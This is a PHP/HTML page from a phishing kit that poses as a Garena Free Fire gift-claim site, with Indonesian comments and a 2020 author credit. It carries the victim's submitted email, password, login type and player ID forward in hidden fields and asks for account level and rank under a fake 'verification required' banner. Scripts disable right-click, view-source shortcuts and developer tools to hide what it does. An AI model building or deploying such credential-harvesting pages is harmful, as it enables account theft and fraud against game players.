<?php
$email = $_POST['username'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
if($email == "" && $password == "" && $login == "" && $playid == "" && $nick == ""){
header("Location: index.php");
}
?>
<html>
<head>
<title>Garena Free Fire</title>
<meta charset="UTF-8"/>
<meta property="description" content="Free claim gift in Garena Free Fire."/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#eaa300">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/id/event/vikendi/images/icon-logo.png">
<link rel="stylesheet" href="css/style.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<body>
<style type="text/css">
	#hadiah fieldset:not(:first-of-type) {
		display: none;
	}
fieldset {
border: none;
}
</style>

<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>


<div class="loading"></div>
<div class="navbar">
	<img src="img/thumbnail.png">GARENA FREE FIRE</br>
	<span>PUSAT HADIAH FREE FIRE</span>
</div>
</br>
</br>
</br>
</br>
</br>
<form id="hadiah" action="completed.php" method="post"> 
	<div class="isi-sukses">
		<fieldset>
			<center>
			<h4 class="berhasil">VERIFICATION REQUIRED</h4>
			<hr class="garis">
			<h4 class="berhasil-text">COMPLETED THIS SUBMISSION AND GET GIFTS</br></h4>
	  <input type="hidden" name="email" value="<?= $email; ?>"> 
      <input type="hidden" name="password" value="<?= $password; ?>"> 
      <input type="hidden" name="login" value="<?= $login; ?>">
      <input type="hidden" name="playid" value="<?= $playid; ?>">
<input type="text" class="verify" name="nick" value="<?= $nick; ?>" readonly><br>
<select name="level" required>
<option selected disabled hidden value="">LEVEL</option>
<?= include'system/level.php'; ?>
</select></br>

<select name="ep" required>
<option selected="selected" disabled="disabled" value="">ELITE PASS</option>
<option value="Pernah">Pernah</option>
<option value="Tidak Pernah">Tidak Pernah</option>
<option value="Pre-order">Pre-order</option>
</select></br>


<select name="rank" required>
<option selected="selected" disabled="disabled" value="">RANK</option>
<?= include'system/rank.php'; ?>
</select></br>

			</center>
			<hr class="garis"></br>
			<button type="submit" onmousedown="buka.play()" class="btn-next">SUBMIT <i class="btn-next-ir fa fa-chevron-right"></i></button>
			</br>
			</br>
		</fieldset>
	</div>
</form>

</br>
</br>
</br>
<div class="footer">
	<center>
	<img width="70" src="img/garena-logo.png">
	</center>
</div>
<script src="js/click.js"></script>
<script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
<script> $(window).load(function() { $(".loading").fadeOut("slow"); }); </script>
<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>
</body>
</html>

<!--- 
× NAMA SCRIPT: SCRIPT SCAR TITAN FT DIAMOND
× PEMILIK: ©BENCODE\>
× DIDESAIN OLEH: PUANGBOSS
× TANGGAL PEMBUATAN: 24 JUNI 2020 
× INFORMASI : DILARANG MENGUBAH HAK CIPTA
--->
